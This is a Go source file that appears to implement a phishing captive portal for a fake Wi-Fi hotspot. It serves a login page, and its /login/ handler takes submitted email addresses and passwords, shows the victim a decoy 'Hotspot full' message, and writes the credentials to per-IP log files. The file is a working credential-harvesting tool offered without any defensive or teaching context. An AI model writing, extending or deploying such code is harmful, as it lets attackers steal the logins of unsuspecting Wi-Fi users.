package main

import (
    "fmt"
    "flag"
    "log"
    "os"
    "io/ioutil"
    "path"
    "net/url"
    "net/http"
)

const INDEX_RAW_HTML = "index.raw.html"
const INDEX_HTML = "index.html"
const SUCCESS_MSG = "Hotspot full. Try again later."

const DEFAULT_PORT = 8080
const DEFAULT_LOG_FOLDER = "__log__"
const DEFAULT_RES_FOLDER = "__res__"

func main() {

    buildPtr := flag.Bool("build", false, "Wether to gather the resources of " + INDEX_RAW_HTML + ". This will exit after build, and not serve.")
    resFolderPtr := flag.String("resFolder", DEFAULT_RES_FOLDER, "The resource folder.")
    logFolderPtr := flag.String("logFolder", DEFAULT_LOG_FOLDER, "The folder to store logs.")
    portPtr := flag.Uint("port", DEFAULT_PORT, "Port to serve on.")

    flag.Parse()
    os.MkdirAll(*logFolderPtr, os.ModePerm)

    if (*buildPtr) {
        build()
    } else {
        serve(*portPtr, *resFolderPtr, *logFolderPtr)
    }

}

func serve(port uint, resFolder string, logFolder string) {

    http.HandleFunc("/",
        func(w http.ResponseWriter, r *http.Request) {
            serveFile(w, r, INDEX_HTML)
    })

    http.HandleFunc("/login/",
        func(w http.ResponseWriter, r *http.Request) {

            fmt.Println(r.Method)
            if (r.Method != "POST") {
               fmt.Fprintln(w, "404 Not found.")
               return
            }

            fmt.Fprintln(w, SUCCESS_MSG)

            body, err := ioutil.ReadAll(r.Body)

            if (err != nil) {
               fmt.Fprintln(w, "404 Not found.")
               log.Print(err)
            }

            values, err := url.ParseQuery(string(body))
            email := values["email"][0]
            pass := values["pass"][0]

            log.Printf("Email: %s, Pass: %s", email, pass)
            logCredentials(r.RemoteAddr, email, pass)

    })

    http.HandleFunc("/" + resFolder + "/",
        func(w http.ResponseWriter, r *http.Request) {
            serveFile(w, r, r.URL.Path[1:])
    })

    addr := ":" + fmt.Sprint(port)

    log.Printf("Serving on %s", addr)
    log.Fatal(http.ListenAndServe(addr, nil))

}

func serveFile(
    w http.ResponseWriter,
    r *http.Request,
    filename string) (error) {

        log.Printf(
            "%s wanted %s and got %s.",
            r.RemoteAddr,
            r.URL,
            filename)

    http.ServeFile(w, r, filename)
    return nil
}

func logCredentials(
    remoteAddr string,
    user string,
    pass string) {

    logfile := path.Join(
        DEFAULT_LOG_FOLDER,
        remoteAddr + ".log")

    file, _ := os.OpenFile(logfile,
        os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    fmt.Fprintf(file, "user: %s, pass: %s\n", user, pass)
    file.Close()

}

func build() {
    fmt.Printf("Building: %s.\n", INDEX_RAW_HTML)
}

